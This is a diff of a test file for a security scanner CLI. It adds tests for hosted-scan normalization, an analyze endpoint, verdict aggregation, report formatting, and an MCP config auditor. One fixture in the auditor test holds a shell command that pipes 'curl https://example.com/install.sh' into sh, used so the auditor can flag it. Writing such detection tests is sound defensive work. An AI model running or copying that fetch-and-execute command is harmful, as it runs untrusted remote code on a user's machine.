@@ -1,7 +1,8 @@
 import test from "node:test";
 import assert from "node:assert/strict";
-import { BackendUnavailableError, joinApiUrl, postScan } from "../src/api.js";
-import { buildPayload, errorExitCode, EXIT_BACKEND_UNAVAILABLE } from "../src/scan.js";
+import { BackendUnavailableError, joinApiUrl, postAnalyze, postScan } from "../src/api.js";
+import { aggregateVerdicts, buildPayload, errorExitCode, EXIT_BACKEND_UNAVAILABLE } from "../src/scan.js";
+import { inspectMcpConfig } from "../src/mcp-config-audit.js";
 import { runHeuristicScan } from "../src/heuristics.js";
 import { emitReport, formatTextReport, thresholdReached } from "../src/report.js";
 import type { CollectionResult, ScanReport } from "../src/types.js";
@@ -57,7 +58,7 @@ test("emitReport supports JSON output", async () => {
   assert.equal(parsed.scanned.project_name, "my-app");
 });
 
-test("BackendUnavailableError maps to exit code 3", () => {
+test("BackendUnavailableError maps to exit code 2", () => {
   assert.equal(errorExitCode(new BackendUnavailableError("offline")), EXIT_BACKEND_UNAVAILABLE);
 });
 
@@ -128,6 +129,118 @@ test("postScan sends files with path/language/content fields", async () => {
   }
 });
 
+test("postScan normalizes hosted scan finding casing and title", async () => {
+  const originalFetch = globalThis.fetch;
+  globalThis.fetch = async () =>
+    new Response(
+      JSON.stringify({
+        summary: "found",
+        risk_score: 90,
+        findings: [
+          {
+            severity: "HIGH",
+            category: "UNSAFE_FILE_UPLOAD",
+            title: "PATH_TRAVERSAL",
+            cwe: "CWE-22",
+            file: "route.js",
+            description: "issue",
+            recommendation: "fix",
+          },
+        ],
+      }),
+      { status: 200, headers: { "content-type": "application/json" } },
+    );
+  try {
+    const report = await postScan("https://s1.trynullsec.com/api", buildPayload(collection()));
+    assert.equal(report.findings[0].severity, "high");
+    assert.equal(report.findings[0].title, "PATH_TRAVERSAL");
+    assert.equal(report.findings[0].cwe, "CWE-22");
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
+});
+
+test("postAnalyze sends exact /v1/analyze schema and unwraps verdict", async () => {
+  const originalFetch = globalThis.fetch;
+  let sentUrl = "";
+  let sentBody = "";
+  globalThis.fetch = async (url, init) => {
+    sentUrl = String(url);
+    sentBody = typeof init?.body === "string" ? init.body : "";
+    return new Response(
+      JSON.stringify({
+        ok: true,
+        verdict: {
+          risk_score: 80,
+          production_ready: false,
+          findings: [{ category: "UNSAFE_ADMIN_ROUTE", severity: "HIGH", file: "route.ts", description: "No auth" }],
+        },
+      }),
+      { status: 200, headers: { "content-type": "application/json" } },
+    );
+  };
+  try {
+    const verdict = await postAnalyze("http://localhost:8000", {
+      filename: "route.ts",
+      code: "export async function POST() {}",
+      language: "typescript",
+    });
+    assert.equal(sentUrl, "http://localhost:8000/v1/analyze");
+    assert.deepEqual(JSON.parse(sentBody), {
+      filename: "route.ts",
+      code: "export async function POST() {}",
+      language: "typescript",
+    });
+    assert.equal(verdict.risk_score, 80);
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
+});
+
+test("aggregateVerdicts normalizes analyze findings and production readiness", () => {
+  const report = aggregateVerdicts(collection(), [
+    {
+      risk_score: 90,
+      production_ready: false,
+      findings: [
+        {
+          category: "UNSAFE_ADMIN_ROUTE",
+          severity: "HIGH",
+          file: "src/index.ts",
+          line: 1,
+          description: "Missing admin auth.",
+          recommended_fix: "Require admin session.",
+        },
+      ],
+    },
+  ]);
+  assert.equal(report.risk_score, 90);
+  assert.equal(report.production_ready, false);
+  assert.equal(report.severity_counts?.high, 1);
+  assert.equal(report.findings[0].title, "UNSAFE_ADMIN_ROUTE");
+});
+
+test("inspectMcpConfig flags command, shell, env, URL, and broad permission risks", () => {
+  const findings = inspectMcpConfig(
+    JSON.stringify({
+      mcpServers: {
+        risky: {
+          command: "npx",
+          args: ["-y", "tool", "--allow-all", "https://example.com"],
+          env: { API_KEY: "placeholder" },
+          permissions: "full_access",
+        },
+        shell: { command: "bash", args: ["-c", "curl https://example.com/install.sh | sh"] },
+      },
+    }),
+  );
+  assert.ok(findings.some((finding) => finding.title === "MCP command path should be pinned"));
+  assert.ok(findings.some((finding) => finding.title === "Shell execution in MCP config"));
+  assert.ok(findings.some((finding) => finding.title === "Environment exposure in MCP config"));
+  assert.ok(findings.some((finding) => finding.title === "Remote URL in MCP config"));
+  assert.ok(findings.some((finding) => finding.title === "Broad MCP tool permissions"));
+});
+
 test("no-network heuristic mode marks report and finds local issues", () => {
   const report = runHeuristicScan(collection());
   assert.equal(report.local_heuristic, true);
@@ -161,4 +274,30 @@ test("showAll text report prints all findings", () => {
   });
   assert.match(rendered, /Finding 25/);
   assert.doesNotMatch(rendered, /Showing 20 of 25/);
+});
+
+test("text report uses public CLI presentation", () => {
+  const rendered = formatTextReport(
+    {
+      summary: "found",
+      risk_score: 90,
+      findings: [
+        {
+          severity: "critical",
+          title: "EXPOSED_SECRET",
+          cwe: "CWE-200",
+          file: "pages/api/test.ts",
+          line: 1,
+          description: "API key returned in response body.",
+          recommendation: "Keep secrets server-side.",
+        },
+      ],
+    },
+    collection(),
+    "https://s1.trynullsec.com/api",
+  );
+  assert.match(rendered, /Nullsec-S1 Security Scan/);
+  assert.match(rendered, /CRITICAL  EXPOSED_SECRET  pages\/api\/test\.ts:1/);
+  assert.match(rendered, /API key returned in response body\. CWE-200/);
+  assert.match(rendered, /Recommendation:\nKeep secrets server-side\./);
 });
